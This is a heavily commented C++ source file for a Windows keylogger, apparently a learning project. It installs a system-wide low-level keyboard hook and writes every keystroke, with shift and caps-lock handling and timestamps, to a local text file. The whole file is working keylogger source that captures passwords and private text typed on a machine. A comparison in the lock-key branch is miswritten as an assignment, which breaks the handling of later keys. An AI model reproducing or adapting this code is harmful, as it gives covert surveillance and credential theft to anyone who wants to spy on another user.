// -------------------------------------------
// headers
// -------------------------------------------

#include <windows.h> // necessary for windows
#include <fstream> // opening, writing, and closing files
#include <iostream> // console input/output
#include <string> // std::string class
#include <ctime> // time functions
#include <iomanip> // stream formatting 

// -------------------------------------------
// global variables
// -------------------------------------------

// file stream object
std::ofstream logFile;

// store the ID of our keyboard hook
HHOOK keyboardHook;

// track whether it is the first keystroke of the session
bool isFirstKey = true;

// -------------------------------------------
// Time helper
// -------------------------------------------
std::string GetFormattedTime() {
    // store current variable
    time_t now = time(0);

    // structure to convert to readable format
    struct tm timeinfo;

    // convert time_t to tm structure
    localtime_s(&timeinfo, &now);

    // array to store formatted string
    char buffer[20];

    // foramt and print time
    strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);

    // convert c style string to c++ string
    return std::string(buffer);
}

// -------------------------------------------
// Log Keystrokes
// -------------------------------------------

void LogKey(int vkCode) {
    // open log file, put in append mode as to not overwrite previous data
    logFile.open("keylogger.txt", std::ios::app);

    // print a header when keylogger session first starts
    if (isFirstKey) {
        logFile << "\n" << std::string(60, '=') << "\n";
        logFile << "SESSION STARTED: " << GetFormattedTime() << "\n";
        logFile << std::string(60, '=') << "\n\n";

        isFirstKey = false;
    }

    // ===========================================
    // Check Modifier States
    // ===========================================

    // Check if shift is currently being held down
    bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

    // Check if caps lock is currently enabled
    bool capsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;


    // ===========================================
    // Convert VKC to readable characters
    // ===========================================

    // SPECIAL CONTROL KEYS

    if (vkCode == VK_SPACE) {
        logFile << " ";
    }
    else if (vkCode == VK_RETURN) {
        logFile << "\n" << GetFormattedTime() << " [ENTER]\n";
    }
    else if (vkCode == VK_BACK) {
        logFile << GetFormattedTime() << " [BACKSPACE] ";
    }
    else if (vkCode == VK_TAB) {
        logFile << GetFormattedTime() << " [TAB] ";
    }
    else if (vkCode == VK_ESCAPE) {
        logFile << GetFormattedTime() << " [ESC] ";
    }
    else if (vkCode == VK_DELETE) {
        logFile << GetFormattedTime() << " [DELETE] ";
    }

    // letters keys (A-Z)
    // 0x41 through 0x5A are letters A through Z
    // 0x41 = 'A'
    else if (vkCode >= 0x41 && vkCode <= 0x5A) {
        // Determine if letter should be uppercase (XOR logic: shift XOR caps)
        bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);

        if (isUpperCase) {
            logFile << (char)vkCode; // Already uppercase in vkCode
        }
        else {
            logFile << (char)(vkCode + 32); // Convert to lowercase (add 32)
        }
    }


    // numbers keys (0-9)
    // 0x30 through 0x39
    else if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (shiftPressed) {
            // Map numbers to their shift-modified characters
            char shiftNumbers[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};

            int index = vkCode - 0x30; // Convert vkCode to array index (0-9)
            logFile << shiftNumbers[index];
        }
        else {
            logFile << (char)vkCode; // Regular number
        }
    }

    // punctuation and special characters
    else if (vkCode == 0xBA || vkCode == 186) {
        // Colon/ SemiColon
        logFile << (shiftPressed ? ':' : ';');
    }
        else if (vkCode == 0xBB || vkCode == 187) {
        // Equals/Plus key
        logFile << (shiftPressed ? '+' : '=');
    }
    else if (vkCode == 0xBC || vkCode == 188) {
        // Comma/Less than key
        logFile << (shiftPressed ? '<' : ',');
    }
    else if (vkCode == 0xBD || vkCode == 189) {
        // Minus/Underscore key
        logFile << (shiftPressed ? '_' : '-');
    }
    else if (vkCode == 0xBE || vkCode == 190) {
        // Period/Greater than key
        logFile << (shiftPressed ? '>' : '.');
    }
    else if (vkCode == 0xBF || vkCode == 191) {
        // Forward slash/Question mark key
        logFile << (shiftPressed ? '?' : '/');
    }
    else if (vkCode == 0xC0 || vkCode == 192) {
        // Backtick/Tilde key
        logFile << (shiftPressed ? '~' : '`');
    }
    else if (vkCode == 0xDB || vkCode == 219) {
        // Left bracket key
        logFile << (shiftPressed ? '{' : '[');
    }
    else if (vkCode == 0xDC || vkCode == 220) {
        // Backslash/Pipe key
        logFile << (shiftPressed ? '|' : '\\');
    }
    else if (vkCode == 0xDD || vkCode == 221) {
        // Right bracket key
        logFile << (shiftPressed ? '}' : ']');
    }
    else if (vkCode == 0xDE || vkCode == 222) {
        // Quote key
        logFile << (shiftPressed ? '"' : '\'');
    }

    // function keys
    // VK_F1 through VK_F12
    else if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        // Calculate which F key was pressed (F1 = 1, F2 = 2, etc.)
        int functionKeyNumber = (vkCode - VK_F1) + 1;
        logFile << GetFormattedTime() << " [F" << functionKeyNumber << "] ";
    }

    // arrow keys
    else if (vkCode == VK_LEFT) {
        logFile << GetFormattedTime() << " [LEFT] ";
    }
    else if (vkCode == VK_RIGHT) {
        logFile << GetFormattedTime() << " [RIGHT] ";
    }
    else if (vkCode == VK_UP) {
        logFile << GetFormattedTime() << " [UP] ";
    }
    else if (vkCode == VK_DOWN) {
        logFile << GetFormattedTime() << " [DOWN] ";
    }

    // modifier keys (left/right versions)
    else if (vkCode == 160 || vkCode == 0xA0) {
        // Left Shift key
        logFile << GetFormattedTime() << " [LSHIFT] ";
    }
    else if (vkCode == 161 || vkCode == 0xA1) {
        // Right Shift key
        logFile << GetFormattedTime() << " [RSHIFT] ";
    }
    else if (vkCode == 162 || vkCode == 0xA2) {
        // Left Control key 
        logFile << GetFormattedTime() << " [LCTRL] ";
    }
    else if (vkCode == 163 || vkCode == 0xA3) {
        // Right Control key
        logFile << GetFormattedTime() << " [RCTRL] ";
    }
    else if (vkCode == 164 || vkCode == 0xA4) {
        // Left Alt key
        logFile << GetFormattedTime() << " [LALT] ";
    }
    else if (vkCode == 165 || vkCode == 0xA5) {
        // Right Alt key
        logFile << GetFormattedTime() << " [RALT] ";
    }

    // lock keys and special keys
    else if (vkCode = VK_CAPITAL) {
        // Caps Lock Key
        logFile << GetFormattedTime() << " [CAPSLOCK] ";
    }
        else if (vkCode == VK_NUMLOCK) {
        // Num Lock key
        logFile << GetFormattedTime() << " [NUMLOCK] ";
    }
    else if (vkCode == VK_SCROLL) {
        // Scroll Lock key
        logFile << GetFormattedTime() << " [SCROLLLOCK] ";
    }
    else if (vkCode == 0x5B || vkCode == 91) {
        // Left Windows key
        logFile << GetFormattedTime() << " [LWIN] ";
    }
    else if (vkCode == 0x5C || vkCode == 92) {
        // Right Windows key
        logFile << GetFormattedTime() << " [RWIN] ";
    }
    else if (vkCode == VK_APPS) {
        // Applications/Menu key
        logFile << GetFormattedTime() << " [APPS] ";
    }

    // Unkown/Unhandled Keys
    else {
        logFile << GetFormattedTime() << " [UNKNOWN_KEY:" << vkCode << " (0x" << std::hex << vkCode << std::dec << ")] ";
    }

    // ===========================================
    // SAVE DATA TO DISK
    // ===========================================
    logFile.flush(); // safety check to make sure to save
    logFile.close(); // closing log file
}

// -------------------------------------------
// Keyboard Hook Callback Function
// -------------------------------------------

LRESULT CALLBACK LowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // nCode >= 0 means we should process this message
    if (nCode >= 0) {
        // Only process key press events (not key releases)
        if (wParam == WM_KEYDOWN) {
            // Extract keyboard information from the hook structure
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

            int vkCode = kbdStruct->vkCode; // Get the virtual key code

            LogKey(vkCode); // Log the keystroke
        }
    }

    // Pass the message to the next hook in the chain
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// -------------------------------------------
// main function
// -------------------------------------------
// Handler for console control events (like closing the window)
BOOL WINAPI ConsoleHandler(DWORD dwType) {
    if (dwType == CTRL_CLOSE_EVENT) {
        // Log session end when console window is closed
        logFile.open("keylogger.txt", std::ios::app);
        if (logFile.is_open()) {
            logFile << "\n" << std::string(60, '=') << "\n";
            logFile << "SESSION ENDED: " << GetFormattedTime() << "\n";
            logFile << std::string(60, '=') << "\n\n";
            logFile.flush();
            logFile.close();
        }

        // Clean up the keyboard hook
        if (keyboardHook != NULL) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    return TRUE;
}


int main() {
    std::cout << "Welcome to your keylogger! Close the window to exit.\n";
    std::cout << "All keystrokes will be logged to the keylogger.txt file.\n";

    // Register handler for console close events
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    // ===========================================
    // Get process handle
    // ===========================================
    // Get handle to current module (required for hook installation)
    HINSTANCE hInstance = GetModuleHandle(NULL);

    // ===========================================
    // Install keyboard hook
    // ===========================================
    // Install low-level keyboard hook to capture all keystrokes system-wide
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyBoardProc, hInstance, 0);

    // ===========================================
    // Check if hook was installed successfully
    // ===========================================
    if (keyboardHook == NULL) {
        std::cerr << "Failed to install the keyboard hook\n";
        std::cerr << "Please make sure you are running the programing as Administrator.\n";
        return 1;
    }

    std::cout << "Keyboard hook installed successfully.\n";
    std::cout << "Monitoring keyboard input...\n";

    // ===========================================
    // Message loop
    // ===========================================
    // Windows message loop - required to keep the hook active and process messages
    MSG msg; // The structure to hold message information
    BOOL bRet; // return value from GetMessage()

    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        // check for errors
        if (bRet == -1) {
            std::cerr << "There was an error in your message loop.\n";
            break;
        }
        else {
            // Process and dispatch Windows messages (keeps hook active)
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    // ===========================================
    // Cleanup (uninstalling the hook)
    // ===========================================
    // Log session end and clean up resources
    logFile.open("keylogger.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << "\n" << std::string(60, '=') << "\n";
        logFile << "SESSION ENDED: " << GetFormattedTime() << "\n";
        logFile << std::string(60, '=') << "\n\n";
        logFile.flush();;
        logFile.close();
    }
    // Remove the keyboard hook before exiting
    UnhookWindowsHookEx(keyboardHook);

    std::cout << "Keyboard Hook uninstalled. Goodbye!\n";

    return 0;
}
